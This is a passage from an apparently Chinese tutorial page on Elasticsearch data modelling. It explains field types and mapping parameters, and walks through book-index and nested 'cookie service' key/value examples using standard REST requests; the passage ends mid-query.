性能需求</h3><p><img src="/images/big-data/es-06/57.jpg" alt="57"></p><h3 id="如何对字段进行建模"><a href="#如何对字段进行建模" class="headerlink" title="如何对字段进行建模"></a>如何对字段进行建模</h3><p><img src="/images/big-data/es-06/58.jpg" alt="58"></p><h3 id="字段类型-：-Text-v-s-Keyword"><a href="#字段类型-：-Text-v-s-Keyword" class="headerlink" title="字段类型 ： Text v.s Keyword"></a>字段类型 ： Text v.s Keyword</h3><ul><li>Text<ul><li>用于全文本字段，文本会被 Analyzer 分词</li><li>默认不支持聚合分析及排序。需要设置 fielddata 为 true</li></ul></li><li>Keyword<ul><li>用于 id ，枚举及不需要分词的文本。例如电话号码，email 地址，手机号码，邮政编码，性别等</li><li>适用于 Filter（精确匹配），Sorting 和 Aggregations</li></ul></li><li>设置多字段类型<ul><li>默认会为文本类型设置成 text ，并且设置一个 keyword 的子字段</li><li>在处理人类语言时，通过增加 “英文”，“拼音” 和 “标准” 分词器，提高搜索结构</li></ul></li></ul><h3 id="字段类型：结构化数据"><a href="#字段类型：结构化数据" class="headerlink" title="字段类型：结构化数据"></a>字段类型：结构化数据</h3><ul><li>数据类型<ul><li>尽量选择贴近的类型。例如可以用 byte，就不要用 long</li></ul></li><li>枚举类型<ul><li>设置为 keyword 。即便是数字，也应该设置成 keyword ，获取更好的性能</li></ul></li><li>其他<ul><li>日期、布尔、地理信息</li></ul></li></ul><h3 id="检索"><a href="#检索" class="headerlink" title="检索"></a>检索</h3><ul><li>如不需要检索，排序和聚合分析<ul><li>Enable 设置成 false</li></ul></li><li>如不需要检索<ul><li>index 设置成 false</li></ul></li><li>对需要检索的字段，可以通过如下配置，设置存储粒度<ul><li>Index_options / Norms : 不需要归一化数据时，可以关闭</li></ul></li></ul><h3 id="聚合及排序"><a href="#聚合及排序" class="headerlink" title="聚合及排序"></a>聚合及排序</h3><ul><li>如不需要检索，排序和聚合分析<ul><li>Enable 设置成 false</li></ul></li><li>如不需要排序或者聚合分析功能<ul><li>Doc_values / fielddata 设置成 false</li></ul></li><li>更新频繁，聚合查询频繁的 keyword 类型的字段<ul><li>推荐将 eager_global_ordinals 设置为 true</li></ul></li></ul><h3 id="额外的存储"><a href="#额外的存储" class="headerlink" title="额外的存储"></a>额外的存储</h3><ul><li>是否需要专门存储当前字段数据<ul><li>Store 设置为 true ，可以存储该字段的原始数据</li><li>一般结合 _source 的 enabled 为 false 时候使用</li></ul></li><li>Disable _source ： 节约磁盘，适用于指标型数据<ul><li>一般建议先考虑增加压缩比</li><li>无法看到 _source 字段，无法做 ReIndex，无法做 Update</li><li>Kibana 中无法做 discovery</li></ul></li></ul><h3 id="一个数据建模的实例"><a href="#一个数据建模的实例" class="headerlink" title="一个数据建模的实例"></a>一个数据建模的实例</h3><ul><li>图书的索引<ul><li>书名</li><li>简介</li><li>作者</li><li>发行日期</li><li>图书封面</li></ul></li></ul><p><img src="/images/big-data/es-06/59.jpg" alt="59"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">PUT books/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Mastering ElasticSearch 5.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>:<span class="string">"Master the searching, indexing, and aggregation features in ElasticSearch Improve users’ search experience with Elasticsearch’s functionalities and develop your own Elasticsearch plugins"</span>,</span><br><span class="line">  <span class="attr">"author"</span>:<span class="string">"Bharvi Dixit"</span>,</span><br><span class="line">  <span class="attr">"public_date"</span>:<span class="string">"2017"</span>,</span><br><span class="line">  <span class="attr">"cover_url"</span>:<span class="string">"https://images-na.ssl-images-amazon.com/images/I/51OeaMFxcML.jpg"</span></span><br><span class="line">&#125;</span><br><span class="line">GET books/_mapping</span><br><span class="line"><span class="comment">// return </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"books"</span> : &#123;</span><br><span class="line">    <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">      <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"author"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"cover_url"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"description"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"public_date"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"title"</span> : &#123;</span><br><span class="line">          <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">          <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">              <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">              <span class="attr">"ignore_above"</span> : <span class="number">256</span></span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="优化字段的设定"><a href="#优化字段的设定" class="headerlink" title="优化字段的设定"></a>优化字段的设定</h3><ul><li>图书的索引<ul><li>书名：支持全文和精确匹配</li><li>简介：支持全文</li><li>作者：精确值</li><li>发行日期：日期类型</li><li>图书封面：精确值</li></ul></li></ul><p><img src="/images/big-data/es-06/60.jpg" alt="60"></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 优化字段类型</span></span><br><span class="line">PUT books</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">      <span class="attr">"author"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"keyword"</span>&#125;,</span><br><span class="line">      <span class="attr">"cover_url"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"keyword"</span>,<span class="attr">"index"</span>: <span class="literal">false</span>&#125;,</span><br><span class="line">      <span class="attr">"description"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"text"</span>&#125;,</span><br><span class="line">      <span class="attr">"public_date"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"date"</span>&#125;,</span><br><span class="line">      <span class="attr">"title"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">          <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"ignore_above"</span> : <span class="number">100</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Cover URL index 设置成false，无法对该字段进行搜索</span></span><br><span class="line">POST books/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"term"</span>: &#123;</span><br><span class="line">      <span class="attr">"cover_url"</span>: &#123;</span><br><span class="line">        <span class="attr">"value"</span>: <span class="string">"https://images-na.ssl-images-amazon.com/images/I/51OeaMFxcML.jpg"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cover URL index 设置成false，依然支持聚合分析</span></span><br><span class="line">POST books/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"aggs"</span>: &#123;</span><br><span class="line">    <span class="attr">"cover"</span>: &#123;</span><br><span class="line">      <span class="attr">"terms"</span>: &#123;</span><br><span class="line">        <span class="attr">"field"</span>: <span class="string">"cover_url"</span>,</span><br><span class="line">        <span class="attr">"size"</span>: <span class="number">10</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="需求变更"><a href="#需求变更" class="headerlink" title="需求变更"></a>需求变更</h3><ul><li>新需求：增加图书内容的字段，并要求能被搜索同时支持高亮显示</li><li>新需求会导致 _source 的内容过大<ul><li>Source Filtering 只是传输给客户端进行过滤，Fetch 数据时，ES 节点还是会传输 _source 中的数据</li></ul></li><li>解决方法<ul><li>关闭 _source</li><li>然后将每个字段的 “store” 设置成 true</li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DELETE books</span><br><span class="line"><span class="comment">// 新增 Content字段。数据量很大。选择将Source 关闭</span></span><br><span class="line">PUT books</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span> : &#123;</span><br><span class="line">    <span class="attr">"_source"</span>: &#123;<span class="attr">"enabled"</span>: <span class="literal">false</span>&#125;,</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">      <span class="attr">"author"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"keyword"</span>,<span class="attr">"store"</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">      <span class="attr">"cover_url"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"keyword"</span>,<span class="attr">"index"</span>: <span class="literal">false</span>,<span class="attr">"store"</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">      <span class="attr">"description"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"text"</span>,<span class="attr">"store"</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">       <span class="attr">"content"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"text"</span>,<span class="attr">"store"</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">      <span class="attr">"public_date"</span> : &#123;<span class="attr">"type"</span> : <span class="string">"date"</span>,<span class="attr">"store"</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">      <span class="attr">"title"</span> : &#123;</span><br><span class="line">        <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">          <span class="attr">"keyword"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"ignore_above"</span> : <span class="number">100</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"store"</span>: <span class="literal">true</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="查询图书：解决字段过大引发的性能问题"><a href="#查询图书：解决字段过大引发的性能问题" class="headerlink" title="查询图书：解决字段过大引发的性能问题"></a>查询图书：解决字段过大引发的性能问题</h3><ul><li>返回结果不包含 _source 字段</li><li>对于需要显示的信息，可以在查询中指定 “store_fields”</li><li>禁止 _source 字段后，还是支持使用 hignlights API ，高亮显示 content 中的匹配的相关信息</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Index 一本书的信息,包含Content</span></span><br><span class="line">PUT books/_doc/1</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"title"</span>:<span class="string">"Mastering ElasticSearch 5.0"</span>,</span><br><span class="line">  <span class="attr">"description"</span>:<span class="string">"Master the searching, indexing, and aggregation features in ElasticSearch Improve users’ search experience with Elasticsearch’s functionalities and develop your own Elasticsearch plugins"</span>,</span><br><span class="line">  <span class="attr">"content"</span>:<span class="string">"The content of the book......Indexing data, aggregation, searching.    something else. something in the way............"</span>,</span><br><span class="line">  <span class="attr">"author"</span>:<span class="string">"Bharvi Dixit"</span>,</span><br><span class="line">  <span class="attr">"public_date"</span>:<span class="string">"2017"</span>,</span><br><span class="line">  <span class="attr">"cover_url"</span>:<span class="string">"https://images-na.ssl-images-amazon.com/images/I/51OeaMFxcML.jpg"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询结果中，Source不包含数据</span></span><br><span class="line">POST books/_search</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索，通过store 字段显示数据，同时高亮显示 conent的内容</span></span><br><span class="line">POST books/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"stored_fields"</span>: [<span class="string">"title"</span>,<span class="string">"author"</span>,<span class="string">"public_date"</span>],</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"match"</span>: &#123;</span><br><span class="line">      <span class="attr">"content"</span>: <span class="string">"searching"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"highlight"</span>: &#123;</span><br><span class="line">    <span class="attr">"fields"</span>: &#123;</span><br><span class="line">      <span class="attr">"content"</span>:&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mapping-字段的相关设置"><a href="#Mapping-字段的相关设置" class="headerlink" title="Mapping 字段的相关设置"></a>Mapping 字段的相关设置</h3><ul><li>Enabled - 设置成 false，仅做存储，不支持搜索和聚合分析 （数据保存在_source 中）</li><li>Index - 是否构倒排索引。设置成 false，无法被搜索，但还是支持 aggregation，并出现在 _source<br>中</li><li>Norms - 如果字段用来过滤和聚合分析，可以关闭，节约存储</li><li>Doc_values - 是否启用 doc_values，用于排序和聚合分析</li><li>Field_data - 如果要对 text 类型启用排序和聚合分析， fielddata 需要设置成true</li><li>Store - 默认不存储，数据默认存储在 _source</li><li>Coerce - 默认开启，是否开启数据类型的自动转换（例如，字符串转数字）</li><li>Multifields 多字段特性</li><li>Dynamic - true / false / strict 控制 Mapping 的自动更新</li></ul><blockquote><p><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-params.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/mapping-params.html</a></p></blockquote><h3 id="一些相关的-API"><a href="#一些相关的-API" class="headerlink" title="一些相关的 API"></a>一些相关的 API</h3><ul><li>Index Template &amp; Dynamic Template<ul><li>根据索引的名字匹配不同的 Mappings 和 Settings</li><li>可以在⼀个 Mapping 上动态的设定字段类型</li></ul></li><li>Index Alias<ul><li>⽆需停机，⽆需修改程序，即可进⾏修改</li></ul></li><li>Update By Query &amp; Reindex</li></ul><h2 id="Elasticsearch-数据建模佳实践"><a href="#Elasticsearch-数据建模佳实践" class="headerlink" title="Elasticsearch 数据建模佳实践"></a>Elasticsearch 数据建模佳实践</h2><h3 id="建模建议（一）：如何处理关联关系"><a href="#建模建议（一）：如何处理关联关系" class="headerlink" title="建模建议（一）：如何处理关联关系"></a>建模建议（一）：如何处理关联关系</h3><ul><li>Object ： 优先考虑 Denormailzation</li><li>Nested ： 当数据包含多数值对象（对个演员），同时有查询需求</li><li>Child/Parent: 关联文档更新非常频繁时</li></ul><h3 id="Kibana"><a href="#Kibana" class="headerlink" title="Kibana"></a>Kibana</h3><ul><li>Kibana 目前暂不支持 nested 类型 和 parent /child 类型，在未来有可能会支持</li><li>如果需要使用 Kibana 进行数据分析，在数据建模时仍需要对嵌套和父子关联类型作出取舍</li></ul><h3 id="建模建议（二）：避免过多字段"><a href="#建模建议（二）：避免过多字段" class="headerlink" title="建模建议（二）：避免过多字段"></a>建模建议（二）：避免过多字段</h3><ul><li>一个文档中，最好避免大量的字段<ul><li>过多的字段数不容易维护</li><li>Mapping 信息保存在 Cluster State 中， 数据量过大，对集群性能会有影响（Cluster State 信息需要和所有的节点同步）</li><li>删除或者修改数据需要 reindex</li></ul></li><li>默认最大字段数是 1000，可以设置 <code>index.mapping.total_fields.limit</code> 限制最大的字段数</li><li>什么原因会导致文档中会有成百上千的字段？</li></ul><h3 id="Dynamic-v-s-Strict"><a href="#Dynamic-v-s-Strict" class="headerlink" title="Dynamic v.s Strict"></a>Dynamic v.s Strict</h3><ul><li>Dynamic （生产环境中，尽量不要打开 Dynamic）<ul><li>true - 未知字段会被自动加入</li><li>false - 新字段不会被索引，但是会保存在 _source</li><li>strict - 新增字段不会被索引，文档写入失败</li></ul></li><li>Strict<ul><li>可以控制到字段级别</li></ul></li></ul><h3 id="一个例子：-Cookie-Service-的数据"><a href="#一个例子：-Cookie-Service-的数据" class="headerlink" title="一个例子： Cookie Service 的数据"></a>一个例子： Cookie Service 的数据</h3><ul><li>来自 Cookie Service 的数据<ul><li>Cookie 的键值对很多</li><li>当 Dynamic 设置为 True</li><li>同时采用扁平化的设计，必然导致字段数量的膨胀</li></ul></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">##索引数据，dynamic mapping 会不断加入新增字段</span><br><span class="line">PUT cookie_service/_doc/1</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"url"</span>:<span class="string">"www.google.com"</span>,</span><br><span class="line"> <span class="attr">"cookies"</span>:&#123;</span><br><span class="line">   <span class="attr">"username"</span>:<span class="string">"tom"</span>,</span><br><span class="line">   <span class="attr">"age"</span>:<span class="number">32</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PUT cookie_service/_doc/2</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"url"</span>:<span class="string">"www.amazon.com"</span>,</span><br><span class="line"> <span class="attr">"cookies"</span>:&#123;</span><br><span class="line">   <span class="attr">"login"</span>:<span class="string">"2019-01-01"</span>,</span><br><span class="line">   <span class="attr">"email"</span>:<span class="string">"xyz@abc.com"</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET cookie_service/_mapping</span><br></pre></td></tr></table></figure><h3 id="解决方案：Nested-Object-amp-Key-Value"><a href="#解决方案：Nested-Object-amp-Key-Value" class="headerlink" title="解决方案：Nested Object &amp; Key Value"></a>解决方案：Nested Object &amp; Key Value</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">DELETE cookie_service</span><br><span class="line"><span class="comment">// 使用 Nested 对象，增加key/value</span></span><br><span class="line">PUT cookie_service</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"mappings"</span>: &#123;</span><br><span class="line">    <span class="attr">"properties"</span>: &#123;</span><br><span class="line">      <span class="attr">"cookies"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"nested"</span>,</span><br><span class="line">        <span class="attr">"properties"</span>: &#123;</span><br><span class="line">          <span class="attr">"name"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"dateValue"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"date"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"keywordValue"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"keyword"</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">"IntValue"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"integer"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"url"</span>: &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"text"</span>,</span><br><span class="line">        <span class="attr">"fields"</span>: &#123;</span><br><span class="line">          <span class="attr">"keyword"</span>: &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"ignore_above"</span>: <span class="number">256</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="写入-amp-查询"><a href="#写入-amp-查询" class="headerlink" title="写入 &amp; 查询"></a>写入 &amp; 查询</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">PUT cookie_service/_doc/1</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"url"</span>:<span class="string">"www.google.com"</span>,</span><br><span class="line"> <span class="attr">"cookies"</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>:<span class="string">"username"</span>,</span><br><span class="line">      <span class="attr">"keywordValue"</span>:<span class="string">"tom"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>:<span class="string">"age"</span>,</span><br><span class="line">      <span class="attr">"intValue"</span>:<span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line">   ]</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">PUT cookie_service/_doc/2</span><br><span class="line">&#123;</span><br><span class="line"> <span class="attr">"url"</span>:<span class="string">"www.amazon.com"</span>,</span><br><span class="line"> <span class="attr">"cookies"</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>:<span class="string">"login"</span>,</span><br><span class="line">      <span class="attr">"dateValue"</span>:<span class="string">"2019-01-01"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"name"</span>:<span class="string">"email"</span>,</span><br><span class="line">      <span class="attr">"IntValue"</span>:<span class="number">32</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Nested 查询，通过bool查询进行过滤</span></span><br><span class="line">POST cookie_service/_search</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"query"</span>: &#123;</span><br><span class="line">    <span class="attr">"nested"</span>: &#123;</span><br><span class="line">      <span class="attr">"path"</span>: <span class="string">"cookies"</span>,</span><br><span class="line">      <span class="attr">"query"</span>: &#123;</span><br><span class="line">        <span class="attr">"bool"</span>: &#123;</span><br><span class="line">          <span class="attr">"filter"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="attr">"term"</span>: &#123;</span><br><span class="line">              <span 